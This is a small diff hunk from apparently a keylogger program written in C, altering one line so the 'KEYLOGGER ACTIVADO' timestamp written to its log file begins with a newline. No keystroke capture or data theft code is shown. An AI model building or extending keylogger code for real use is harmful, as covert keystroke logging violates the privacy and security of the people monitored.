@@ -515,7 +515,7 @@ void *keylogger()
     time(&now);
     local_time = localtime(&now);
 
-    fprintf(logfile, "KEYLOGGER ACTIVADO: %04d-%02d-%02d_%02d-%02d-%02d\n", local_time->tm_year + 1900,
+    fprintf(logfile, "\nKEYLOGGER ACTIVADO: %04d-%02d-%02d_%02d-%02d-%02d\n", local_time->tm_year + 1900,
             local_time->tm_mon + 1,
             local_time->tm_mday,
             local_time->tm_hour,
